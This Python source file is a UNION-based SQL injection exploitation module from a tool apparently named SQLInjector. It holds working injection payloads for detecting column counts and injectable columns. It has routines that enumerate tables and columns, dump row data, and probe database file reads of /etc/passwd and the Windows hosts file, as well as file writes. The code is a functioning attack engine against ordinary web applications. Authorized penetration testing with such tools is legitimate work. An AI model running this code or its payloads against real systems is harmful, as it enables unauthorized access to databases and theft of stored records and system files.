"""
UNION-based SQL injection exploitation module.
Handles column count detection, data extraction, and information gathering.
"""
import re
from typing import List, Optional, Dict, Any, Tuple

from ..core.base import BaseModule, ScanConfig, InjectionPoint, DBType
from ..modules.http_engine import HTTPEngine
from ..modules.payload_manager import PayloadManager
from ..utils.logger import get_logger


class UnionExtractor(BaseModule):
    """
    UNION-based SQL injection exploitation engine.
    Provides automated column detection and data extraction capabilities.
    """
    
    def __init__(self, config: ScanConfig):
        super().__init__(config)
        self.logger = get_logger("union_extractor")
        self.http_engine = HTTPEngine(config)
        self.payload_manager = PayloadManager(config)
        
        # Extraction markers
        self.start_marker = "SQLINJECTOR_START"
        self.end_marker = "SQLINJECTOR_END"
    
    def detect_column_count(self, injection_point: InjectionPoint, max_columns: int = 50) -> int:
        """
        Detect the number of columns in the UNION query.
        
        Args:
            injection_point: Confirmed UNION injection point
            max_columns: Maximum number of columns to test
            
        Returns:
            Number of columns, or 0 if detection failed
        """
        self.logger.info("Detecting column count for UNION injection")
        
        # Get baseline response
        baseline = self._get_baseline_response(injection_point)
        
        # Binary search for efficiency
        return self._binary_search_columns(injection_point, baseline, 1, max_columns)
    
    def _binary_search_columns(self, injection_point: InjectionPoint, baseline: Dict[str, Any],
                              min_cols: int, max_cols: int) -> int:
        """
        Use binary search to efficiently find column count.
        
        Args:
            injection_point: Injection point
            baseline: Baseline response
            min_cols: Minimum column count
            max_cols: Maximum column count
            
        Returns:
            Column count or 0 if not found
        """
        while min_cols <= max_cols:
            mid = (min_cols + max_cols) // 2
            
            # Test with mid columns
            if self._test_column_count(injection_point, baseline, mid):
                # Success with mid columns, try fewer
                if mid == 1 or not self._test_column_count(injection_point, baseline, mid - 1):
                    return mid
                max_cols = mid - 1
            else:
                # Failed with mid columns, need more
                min_cols = mid + 1
        
        return 0  # Column count detection failed
    
    def _test_column_count(self, injection_point: InjectionPoint, baseline: Dict[str, Any],
                          column_count: int) -> bool:
        """
        Test if a specific column count works.
        
        Args:
            injection_point: Injection point
            baseline: Baseline response
            column_count: Number of columns to test
            
        Returns:
            True if column count is correct
        """
        # Generate NULL-based UNION payload
        null_values = ",".join(["NULL"] * column_count)
        payloads = [
            f"' UNION SELECT {null_values}--",
            f"\" UNION SELECT {null_values}--",
            f"') UNION SELECT {null_values}--",
            f"\") UNION SELECT {null_values}--",
            f"' UNION ALL SELECT {null_values}--"
        ]
        
        for payload in payloads:
            test_payload = injection_point.original_value + payload
            request_params = self.http_engine.build_request_with_payload(injection_point, test_payload)
            response = self.http_engine.make_request(**request_params)
            
            # Check if UNION worked (no column count error)
            if self._union_successful(response, baseline):
                return True
        
        return False
    
    def _union_successful(self, response: Dict[str, Any], baseline: Dict[str, Any]) -> bool:
        """
        Check if UNION query was successful.
        
        Args:
            response: Response to check
            baseline: Baseline response
            
        Returns:
            True if UNION was successful
        """
        # Check for column count errors
        column_errors = [
            "the used select statements have a different number of columns",
            "operand should contain 1 column",
            "number of columns",
            "column count"
        ]
        
        content_lower = response['content'].lower()
        for error in column_errors:
            if error in content_lower:
                return False
        
        # Check for successful indicators
        # UNION usually changes response length or adds content
        if len(response['content']) != len(baseline['content']):
            return True
        
        # Check for HTTP status changes that might indicate success
        if response['status_code'] != baseline['status_code'] and response['status_code'] == 200:
            return True
        
        return False
    
    def find_injectable_columns(self, injection_point: InjectionPoint, column_count: int) -> List[int]:
        """
        Find which columns can display string data.
        
        Args:
            injection_point: Injection point
            column_count: Number of columns
            
        Returns:
            List of injectable column positions (1-indexed)
        """
        self.logger.info(f"Finding injectable columns out of {column_count}")
        
        injectable_columns = []
        
        for col_pos in range(1, column_count + 1):
            if self._test_column_injectable(injection_point, column_count, col_pos):
                injectable_columns.append(col_pos)
        
        self.logger.info(f"Found {len(injectable_columns)} injectable columns: {injectable_columns}")
        return injectable_columns
    
    def _test_column_injectable(self, injection_point: InjectionPoint, column_count: int,
                               column_position: int) -> bool:
        """
        Test if a specific column can display string data.
        
        Args:
            injection_point: Injection point
            column_count: Total number of columns
            column_position: Position to test (1-indexed)
            
        Returns:
            True if column is injectable
        """
        # Create test marker
        test_marker = f"INJECTABLE_{column_position}"
        
        # Build UNION payload with test marker in specific column
        columns = []
        for i in range(1, column_count + 1):
            if i == column_position:
                columns.append(f"'{test_marker}'")
            else:
                columns.append("NULL")
        
        union_select = ",".join(columns)
        payload = f"' UNION SELECT {union_select}--"
        
        test_payload = injection_point.original_value + payload
        request_params = self.http_engine.build_request_with_payload(injection_point, test_payload)
        response = self.http_engine.make_request(**request_params)
        
        # Check if test marker appears in response
        return test_marker in response['content']
    
    def extract_data(self, injection_point: InjectionPoint, column_count: int,
                    injectable_column: int, query: str) -> Optional[str]:
        """
        Extract data using UNION-based injection.
        
        Args:
            injection_point: Injection point
            column_count: Number of columns
            injectable_column: Injectable column position
            query: SQL query to extract data from (without SELECT)
            
        Returns:
            Extracted data or None if extraction failed
        """
        self.logger.debug(f"Extracting data: {query}")
        
        # Wrap query with markers for easier extraction
        marked_query = f"CONCAT('{self.start_marker}',({query}),'{self.end_marker}')"
        
        # Build UNION payload
        columns = []
        for i in range(1, column_count + 1):
            if i == injectable_column:
                columns.append(marked_query)
            else:
                columns.append("NULL")
        
        union_select = ",".join(columns)
        payload = f"' UNION SELECT {union_select}--"
        
        test_payload = injection_point.original_value + payload
        request_params = self.http_engine.build_request_with_payload(injection_point, test_payload)
        response = self.http_engine.make_request(**request_params)
        
        # Extract data between markers
        return self._extract_between_markers(response['content'])
    
    def _extract_between_markers(self, content: str) -> Optional[str]:
        """
        Extract data between start and end markers.
        
        Args:
            content: Response content
            
        Returns:
            Extracted data or None
        """
        start_pos = content.find(self.start_marker)
        if start_pos == -1:
            return None
        
        start_pos += len(self.start_marker)
        end_pos = content.find(self.end_marker, start_pos)
        if end_pos == -1:
            return None
        
        return content[start_pos:end_pos].strip()
    
    def enumerate_tables(self, injection_point: InjectionPoint, column_count: int,
                        injectable_column: int, db_type: DBType) -> List[str]:
        """
        Enumerate database tables.
        
        Args:
            injection_point: Injection point
            column_count: Number of columns
            injectable_column: Injectable column position
            db_type: Database type
            
        Returns:
            List of table names
        """
        self.logger.info("Enumerating database tables")
        
        # Get table enumeration payload for database type
        info_payloads = self.payload_manager.get_exploitation_payloads(db_type, "information_extraction")
        
        if "tables" not in info_payloads:
            self.logger.warning(f"No table enumeration payload for {db_type.value}")
            return []
        
        table_query = info_payloads["tables"]
        
        # Extract table data
        tables_data = self.extract_data(injection_point, column_count, injectable_column, table_query)
        
        if not tables_data:
            return []
        
        # Parse table names (assuming comma-separated or newline-separated)
        table_names = []
        for line in tables_data.split('\n'):
            for table in line.split(','):
                table = table.strip()
                if table and table not in table_names:
                    table_names.append(table)
        
        self.logger.info(f"Found {len(table_names)} tables")
        return table_names
    
    def enumerate_columns(self, injection_point: InjectionPoint, column_count: int,
                         injectable_column: int, db_type: DBType, table_name: str) -> List[str]:
        """
        Enumerate columns for a specific table.
        
        Args:
            injection_point: Injection point
            column_count: Number of columns
            injectable_column: Injectable column position
            db_type: Database type
            table_name: Target table name
            
        Returns:
            List of column names
        """
        self.logger.info(f"Enumerating columns for table: {table_name}")
        
        # Get column enumeration payload
        info_payloads = self.payload_manager.get_exploitation_payloads(db_type, "information_extraction")
        
        if "columns" not in info_payloads:
            self.logger.warning(f"No column enumeration payload for {db_type.value}")
            return []
        
        column_query = info_payloads["columns"].format(table=table_name)
        
        # Extract column data
        columns_data = self.extract_data(injection_point, column_count, injectable_column, column_query)
        
        if not columns_data:
            return []
        
        # Parse column names
        column_names = []
        for line in columns_data.split('\n'):
            for column in line.split(','):
                column = column.strip()
                if column and column not in column_names:
                    column_names.append(column)
        
        self.logger.info(f"Found {len(column_names)} columns")
        return column_names
    
    def extract_table_data(self, injection_point: InjectionPoint, column_count: int,
                          injectable_column: int, table_name: str, columns: List[str],
                          limit: int = 10) -> List[Dict[str, str]]:
        """
        Extract data from a specific table.
        
        Args:
            injection_point: Injection point
            column_count: Number of columns
            injectable_column: Injectable column position
            table_name: Table to extract from
            columns: Columns to extract
            limit: Maximum number of rows to extract
            
        Returns:
            List of row data as dictionaries
        """
        self.logger.info(f"Extracting data from table: {table_name}")
        
        if not columns:
            return []
        
        # Limit columns to avoid overly long queries
        if len(columns) > 5:
            columns = columns[:5]
            self.logger.info(f"Limited to first 5 columns: {columns}")
        
        # Build data extraction query
        column_list = ",CHAR(124),".join(columns)  # Use | as separator
        data_query = f"SELECT CONCAT({column_list}) FROM {table_name} LIMIT {limit}"
        
        # Extract data
        table_data = self.extract_data(injection_point, column_count, injectable_column, data_query)
        
        if not table_data:
            return []
        
        # Parse extracted data
        rows = []
        for line in table_data.split('\n'):
            if '|' in line:
                values = line.split('|')
                if len(values) == len(columns):
                    row_data = {}
                    for i, column in enumerate(columns):
                        row_data[column] = values[i].strip()
                    rows.append(row_data)
        
        self.logger.info(f"Extracted {len(rows)} rows from {table_name}")
        return rows
    
    def test_file_operations(self, injection_point: InjectionPoint, column_count: int,
                           injectable_column: int, db_type: DBType) -> Dict[str, bool]:
        """
        Test file read/write capabilities.
        
        Args:
            injection_point: Injection point
            column_count: Number of columns
            injectable_column: Injectable column position
            db_type: Database type
            
        Returns:
            Dictionary of supported file operations
        """
        self.logger.info("Testing file operation capabilities")
        
        capabilities = {"file_read": False, "file_write": False}
        
        # Get file operation payloads
        file_payloads = self.payload_manager.get_exploitation_payloads(db_type, "file_operations")
        
        if not file_payloads:
            return capabilities
        
        # Test file read
        if "read" in file_payloads:
            # Test reading a common file (e.g., /etc/passwd on Unix, C:\Windows\System32\drivers\etc\hosts on Windows)
            test_files = ["/etc/passwd", "C:\\Windows\\System32\\drivers\\etc\\hosts", "/etc/hostname"]
            
            for test_file in test_files:
                read_query = file_payloads["read"].format(file_path=test_file)
                result = self.extract_data(injection_point, column_count, injectable_column, read_query)
                
                if result and len(result) > 10:  # Some content found
                    capabilities["file_read"] = True
                    self.logger.info(f"File read capability confirmed: {test_file}")
                    break
        
        # Test file write (only if not in safe mode)
        if not self.config.safe_mode and "write" in file_payloads:
            test_content = "SQLInjector test file"
            test_path = "/tmp/sqlinjector_test.txt"  # Use safe test path
            
            write_query = file_payloads["write"].format(content=test_content, file_path=test_path)
            result = self.extract_data(injection_point, column_count, injectable_column, write_query)
            
            # File write success is harder to detect, assume success if no error
            if result is not None:
                capabilities["file_write"] = True
                self.logger.info("File write capability detected")
        
        return capabilities
    
    def _get_baseline_response(self, injection_point: InjectionPoint) -> Dict[str, Any]:
        """Get baseline response for comparison."""
        request_params = self.http_engine.build_request_with_payload(
            injection_point, injection_point.original_value
        )
        return self.http_engine.make_request(**request_params)